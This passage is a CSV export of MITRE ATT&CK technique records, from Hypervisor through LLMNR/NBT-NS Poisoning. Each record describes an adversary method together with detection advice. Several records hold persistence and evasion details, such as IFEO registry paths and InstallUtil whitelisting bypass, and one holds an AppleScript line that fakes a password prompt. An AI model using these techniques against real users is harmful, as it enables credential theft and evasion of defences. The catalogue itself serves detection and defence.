"attack-pattern","attack-pattern--4be89c7c-ace6-4876-9377-c8d54cef3d63","2017-05-31T21:30:50.958Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Hypervisor","A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. (Citation: Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could be designed with Rootkit functionality to hide its existence from the guest operating system. (Citation: Myers 2007) A malicious hypervisor of this nature could be used to persist on systems through interruption.

Detection: Type-1 hypervisors may be detected by performing timing analysis. Hypervisors emulate certain CPU instructions that would normally be executed by the hardware. If an instruction takes orders of magnitude longer to execute than normal on a system that should not contain a hypervisor, one may be present. (Citation: virtualization.info 2006)

Platforms: Windows

Data Sources: System calls

Permissions Required: Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1062', 'external_id': 'T1062'}, {'source_name': 'Wikipedia Hypervisor', 'description': 'Wikipedia. (2016, May 23). Hypervisor. Retrieved June 11, 2016.', 'url': 'https://en.wikipedia.org/wiki/Hypervisor'}, {'source_name': 'Wikipedia Xen', 'description': 'Xen. (n.d.). In Wikipedia. Retrieved November 13, 2014.', 'url': 'http://en.wikipedia.org/wiki/Xen'}, {'source_name': 'Myers 2007', 'description': 'Myers, M., and Youndt, S. (2007). An Introduction to Hardware-Assisted Virtual Machine (HVM) Rootkits. Retrieved November 13, 2014.', 'url': 'http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.90.8832&rep=rep1&type=pdf'}, {'source_name': 'virtualization.info 2006', 'description': 'virtualization.info. (Interviewer) & Liguori, A. (Interviewee). (2006, August 11). Debunking Blue Pill myth &#91;Interview transcript&#93;. Retrieved November 13, 2014.', 'url': 'http://virtualization.info/en/news/2006/08/debunking-blue-pill-myth.html'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['System calls']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--62166220-e498-410f-a90a-19d4339d4e99","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Image File Execution Options Injection","Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, any executable file present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)

IFEOs can be set directly via the Registry or in Global Flags via the Gflags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as Debugger Values in the Registry under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/<executable>` and ` HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable> ` where `<executable>` is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

Similar to Process Injection, this value can be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Engame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.

Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

Detection: Monitor for common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as `DEBUG_PROCESS` and `DEBUG_ONLY_THIS_PROCESS`. (Citation: Microsoft Dev Blog IFEO Mar 2010)

Monitor the IFEOs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. (Citation: Engame Process Injection July 2017)

Platforms: Windows

Data Sources: Process Monitoring, Windows Registry, Windows event logs

Permissions Required: Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1183', 'external_id': 'T1183'}, {'source_name': 'Microsoft Dev Blog IFEO Mar 2010', 'description': 'Shanbhag, M. (2010, March 24). Image File Execution Options (IFEO). Retrieved December 18, 2017.', 'url': 'https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/'}, {'source_name': 'Microsoft GFlags Mar 2017', 'description': 'Microsoft. (2017, May 23). GFlags Overview. Retrieved December 18, 2017.', 'url': 'https://docs.microsoft.com/windows-hardware/drivers/debugger/gflags-overview'}, {'source_name': 'Engame Process Injection July 2017', 'description': 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.', 'url': 'https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process'}, {'source_name': 'FSecure Hupigon', 'description': 'FSecure. (n.d.). Backdoor - W32/Hupigon.EMV - Threat Description. Retrieved December 18, 2017.', 'url': 'https://www.f-secure.com/v-descs/backdoor%20w32%20hupigon%20emv.shtml'}, {'source_name': 'Symantec Ushedix June 2008', 'description': 'Symantec. (2008, June 28). Trojan.Ushedix. Retrieved December 18, 2017.', 'url': 'https://www.symantec.com/security%20response/writeup.jsp?docid=2008-062807-2501-99&tabid=2'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process Monitoring', 'Windows Registry', 'Windows event logs']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df","2017-05-31T21:30:47.384Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Indicator Blocking","An adversary may attempt to block indicators or events from leaving the host machine. In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process or creating a host-based firewall rule to block traffic to a specific server.

Detection: Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.

Depending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked.

Platforms: Windows

Data Sources: Sensor health and status, Process command-line parameters, Process monitoring

Defense Bypassed: Anti-virus, Log analysis, Host intrusion prevention systems","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1054', 'external_id': 'T1054'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Sensor health and status', 'Process command-line parameters', 'Process monitoring']","","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']"
"attack-pattern","attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6","2017-05-31T21:30:54.176Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Indicator Removal from Tools","If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.

A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use Software Packing or otherwise modify the file so it has a different signature, and then re-use the malware.

Detection: The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.

Platforms: Linux, macOS, Windows

Data Sources: Process use of network, Anti-virus, Binary file metadata, Process command-line parameters, Process monitoring

Defense Bypassed: Anti-virus, Log analysis, Host intrusion prevention systems","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1066', 'external_id': 'T1066'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process use of network', 'Anti-virus', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']"
"attack-pattern","attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69","2017-05-31T21:30:55.892Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Indicator Removal on Host","Adversaries may delete or alter generated event files on a host system, including potentially captured files such as quarantined malware. This may compromise the integrity of the security solution, causing events to go unreported, or make forensic analysis and incident response more difficult due to lack of sufficient data to determine what occurred.

Detection: File system monitoring may be used to detect improper deletion or modification of indicator files. Events not stored on the file system will require different detection mechanisms.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process command-line parameters, Process monitoring

Defense Bypassed: Anti-virus, Log analysis, Host intrusion prevention systems","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1070', 'external_id': 'T1070'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process command-line parameters', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']"
"attack-pattern","attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2","2017-05-31T21:30:48.323Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Input Capture","Adversaries can use methods of capturing user input for obtaining credentials for Valid Accounts and information Collection that include keylogging and user input field interception.

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)

Keylogging is likely to be used to acquire credentials for new access opportunities when Credential Dumping efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.

Adversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service. (Citation: Volexity Virtual Private Keylogging)

Detection: Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState. (Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.

Monitor the Registry for the addition of a Custom Credential Provider. (Citation: Wrightson 2012) Detection of compromised Valid Accounts in use by adversaries may help to catch the result of user input interception if new techniques are used.

Platforms: Linux, macOS, Windows

Data Sources: Windows Registry, Kernel drivers, Process monitoring, API monitoring

Permissions Required: Administrator, SYSTEM

Contributors: John Lambert, Microsoft Threat Intelligence Center","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1056', 'external_id': 'T1056'}, {'source_name': 'Adventures of a Keystroke', 'description': 'Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016.'}, {'source_name': 'Wrightson 2012', 'description': 'Wrightson, T. (2012, January 2). CAPTURING WINDOWS 7 CREDENTIALS AT LOGON USING CUSTOM CREDENTIAL PROVIDER. Retrieved November 12, 2014.', 'url': 'http://blog.leetsys.com/2012/01/02/capturing-windows-7-credentials-at-logon-using-custom-credential-provider/'}, {'source_name': 'Volexity Virtual Private Keylogging', 'description': 'Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017.', 'url': 'https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']","['Administrator', 'SYSTEM']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['John Lambert, Microsoft Threat Intelligence Center']","","","","",""
"attack-pattern","attack-pattern--91ce1ede-107f-4d8b-bf4c-735e8789c94b","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Input Prompt","When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task. Adversaries can mimic this functionality to prompt users for credentials with a normal-looking prompt. This type of prompt can be accomplished with AppleScript:

`set thePassword to the text returned of (display dialog ""AdobeUpdater needs permission to check for updates. Please authenticate."" default answer """")`
 (Citation: OSX Keydnap malware)

Adversaries can prompt a user for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. (Citation: OSX Malware Exploits MacKeeper)

Detection: This technique exploits users' tendencies to always supply credentials when prompted, which makes it very difficult to detect. Monitor process execution for unusual programs as well as AppleScript that could be used to prompt users for credentials.

Platforms: macOS

Data Sources: User interface, Process Monitoring

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1141', 'external_id': 'T1141'}, {'source_name': 'OSX Keydnap malware', 'description': 'Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.', 'url': 'https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/'}, {'source_name': 'OSX Malware Exploits MacKeeper', 'description': 'Sergei Shevchenko. (2015, June 4). New Mac OS Malware Exploits Mackeeper. Retrieved July 3, 2017.', 'url': 'https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['User interface', 'Process Monitoring']","['User']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1","2017-05-31T21:31:42.750Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Install Root Certificate","Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.

Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)

Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)

Detection: A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present.

Installed root certificates are located in the Registry: `HKLM\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates`. There is a subset of root certificates that are consistent across Windows systems and can be used for comparison: (Citation: Tripwire AppUNBlocker)
*18F7C1FCC3090203FD5BAA2F861A754976C8DD25
*245C97DF7514E7CF2DF8BE72AE957B9E04741E85
*3B1EFD3A66EA28B16697394703A72CA340A05BD5
*7F88CD7223F3C813818C994614A89C99FA3B5247
*8F43288AD272F3103B6FB1428485EA3014C0BCFE
*A43489159A520F0D93D032CCAF37E7FE20A8B419
*BE36A4562FB2EE05DBB3D32323ADF445084ED656
*CDD4EEAE6000AC7F40C3802C171E30148030C072

Platforms: Linux, Windows

Data Sources: SSL/TLS inspection, Digital Certificate Logs

Defense Bypassed: Digital Certificate Validation

Permissions Required: Administrator

Contributors: Itzik Kotler, SafeBreach, Travis Smith, Tripwire","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1130', 'external_id': 'T1130'}, {'source_name': 'Wikipedia Root Certificate', 'description': 'Wikipedia. (2016, December 6). Root certificate. Retrieved February 20, 2017.', 'url': 'https://en.wikipedia.org/wiki/Root%20certificate'}, {'source_name': 'Operation Emmental', 'description': 'Sancho, D., Hacquebord, F., Link, R. (2014, July 22). Finding Holes Operation Emmental. Retrieved February 9, 2016.', 'url': 'http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-finding-holes-operation-emmental.pdf'}, {'source_name': 'Kaspersky Superfish', 'description': 'Onuma. (2015, February 24). Superfish: Adware Preinstalled on Lenovo Laptops. Retrieved February 20, 2017.', 'url': 'https://www.kaspersky.com/blog/lenovo-pc-with-adware-superfish-preinstalled/7712/'}, {'source_name': 'Tripwire AppUNBlocker', 'description': 'Smith, T. (2016, October 27). AppUNBlocker: Bypassing AppLocker. Retrieved December 19, 2017.', 'url': 'https://www.tripwire.com/state-of-security/off-topic/appunblocker-bypassing-applocker/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['SSL/TLS inspection', 'Digital Certificate Logs']","['Administrator']","['Linux', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Itzik Kotler, SafeBreach', 'Travis Smith, Tripwire']","","","","","['Digital Certificate Validation']"
"attack-pattern","attack-pattern--f792d02f-813d-402b-86a5-ab98cb391d3b","2017-05-31T21:31:27.510Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","InstallUtil","InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: `C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe` and `C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe`. InstallUtil.exe is digitally signed by Microsoft.

Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute `[System.ComponentModel.RunInstaller(true)]`. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)

Detection: Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

Platforms: Windows

Data Sources: Process monitoring, Process command-line parameters

Defense Bypassed: Process whitelisting

Permissions Required: User

Remote Support: No

Contributors: Casey Smith, Travis Smith, Tripwire","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1118', 'external_id': 'T1118'}, {'source_name': 'MSDN InstallUtil', 'description': 'Microsoft. (n.d.). Installutil.exe (Installer Tool). Retrieved July 1, 2016.', 'url': 'https://msdn.microsoft.com/en-us/library/50614e95.aspx'}, {'source_name': 'SubTee GitHub All The Things Application Whitelisting Bypass', 'description': '[ Smith, C. (2016, August 17). Includes 5 Known Application Whitelisting/ Application Control Bypass Techniques in One File. Retrieved June 30, 2017.'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process monitoring', 'Process command-line parameters']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Casey Smith', 'Travis Smith, Tripwire']","","","False","","['Process whitelisting']"
"attack-pattern","attack-pattern--9e09ddb2-1746-4448-9cad-7f8b41777d6d","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Keychain","Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in `~/Library/Keychains/`,`/Library/Keychains/`, and `/Network/Library/Keychains/`. (Citation: Wikipedia keychain) The `security` command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.

To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user’s logon credentials.

Detection: Unlocking the keychain and using passwords from it is a very common process, so there is likely to be a lot of noise in any detection technique. Monitoring of system calls to the keychain can help determine if there is a suspicious process trying to access it.

Platforms: macOS

Data Sources: System calls, Process Monitoring

Permissions Required: Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1142', 'external_id': 'T1142'}, {'source_name': 'Wikipedia keychain', 'description': 'Wikipedia. (n.d.). Keychain (software). Retrieved July 5, 2017.', 'url': 'https://en.wikipedia.org/wiki/Keychain%20(software)'}, {'source_name': 'External to DA, the OS X Way', 'description': 'Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to DA, the OS X Way. Retrieved July 3, 2017.', 'url': 'http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['System calls', 'Process Monitoring']","['Administrator']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--04ef4356-8926-45e2-9441-634b6f3dcecb","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","LC_LOAD_DYLIB Addition","Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies (Citation: Writing Bad Malware for OSX). There are tools available to perform these changes. Any changes will invalidate digital signatures on binaries because the binary is being modified. Adversaries can remediate this issue by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time (Citation: Malware Persistence on OS X).

Detection: Monitor processes for those that may be used to modify binary headers. Monitor file systems for changes to application binaries and invalid checksums/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious.

Platforms: macOS

Data Sources: Binary file metadata, Process Monitoring, Process command-line parameters, File monitoring

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1161', 'external_id': 'T1161'}, {'source_name': 'Writing Bad Malware for OSX', 'description': 'Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.', 'url': 'https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf'}, {'source_name': 'Malware Persistence on OS X', 'description': 'Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.', 'url': 'https://www.rsaconference.com/writable/presentations/file%20upload/ht-r03-malware-persistence-on-os-x-yosemite%20final.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Binary file metadata', 'Process Monitoring', 'Process command-line parameters', 'File monitoring']","['User']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--a0a189c8-d3bd-4991-bf6f-153d185ee373","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","LC_MAIN Hijacking","As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary’s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD  (Citation: Prolific OSX Malware History). The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn’t know anything was different  (Citation: Methods of Mac Malware Persistence). By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.

Detection: Determining the original entry point for a binary is difficult, but checksum and signature verification is very possible. Modifying the LC_MAIN entry point or adding in an additional LC_MAIN entry point invalidates the signature for the file and can be detected. Collect running process information and compare against known applications to look for suspicious behavior.

Platforms: macOS

Data Sources: Binary file metadata, Malware reverse engineering, Process Monitoring

Defense Bypassed: Application whitelisting, Process whitelisting, Whitelisting by file name or path

Permissions Required: User, Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1149', 'external_id': 'T1149'}, {'source_name': 'Prolific OSX Malware History', 'description': 'Bit9 + Carbon Black Threat Research Team. (2015). 2015: The Most Prolific Year in History for OS X Malware. Retrieved July 8, 2017.', 'url': 'https://assets.documentcloud.org/documents/2459197/bit9-carbon-black-threat-research-report-2015.pdf'}, {'source_name': 'Methods of Mac Malware Persistence', 'description': 'Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.', 'url': 'https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Binary file metadata', 'Malware reverse engineering', 'Process Monitoring']","['User', 'Administrator']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Application whitelisting', 'Process whitelisting', 'Whitelisting by file name or path']"
"attack-pattern","attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","LLMNR/NBT-NS Poisoning","Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)

Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.

Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder. (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)

Detection: Monitor `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` for changes to the ""EnableMulticast"" DWORD value. A value of “0” indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)

Monitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.

Deploy an LLMNR/NBT-NS spoofing detection tool. (Citation: GitHub Conveigh)

Platforms: Windows

Data Sources: Windows Registry, Packet capture, Netflow/Enclave netflow

Permissions Required: User

